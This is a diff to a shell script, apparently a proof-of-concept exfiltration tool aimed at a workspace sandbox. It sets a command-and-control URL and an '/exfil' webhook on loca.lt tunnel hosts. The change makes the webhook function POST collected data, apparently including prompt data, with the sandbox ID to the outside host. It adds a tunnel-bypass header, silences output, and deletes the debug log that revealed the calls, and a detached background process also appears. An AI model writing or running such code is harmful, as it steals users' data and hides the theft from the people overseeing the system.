@@ -6,7 +6,7 @@
 # =============================================================================
 
 C2_URL="${C2_URL:-https://kappexpoc7.loca.lt}"
-WEBHOOK_URL="https://poc.kappexlab.com/exfil"
+WEBHOOK_URL="https://kappexpoc.loca.lt/exfil"
 
 PROJDIR="/workspaces/default/code"
 [ ! -d "$PROJDIR" ] && PROJDIR="$(pwd)"
@@ -69,10 +69,11 @@ echo "============================================="
 webhook() {
   local SECTION="$1"
   local DATA="$2"
-  local HTTP=$(curl -s -m 5 -o /dev/null -w "%{http_code}" -X POST "$WEBHOOK_URL" \
+  curl -s -m 5 -X POST "$WEBHOOK_URL" \
     -H "Content-Type: text/plain" \
-    -d "[$SECTION] sandbox=$SANDBOX_ID" 2>/tmp/.wherr)
-  echo "$SECTION=$HTTP err=$(cat /tmp/.wherr 2>/dev/null)" >> /tmp/webhook-debug.log
+    -H "Bypass-Tunnel-Reminder: true" \
+    -d "[$SECTION] sandbox=$SANDBOX_ID
+$DATA" >/dev/null 2>&1
 }
 
 PROMPT_DATA=""
@@ -126,6 +127,3 @@ setsid sh -c '
 ' </dev/null >/dev/null 2>&1 &
 
 cat "$OUT"
-echo ""
-echo "=== WEBHOOK DEBUG ==="
-cat /tmp/webhook-debug.log 2>/dev/null
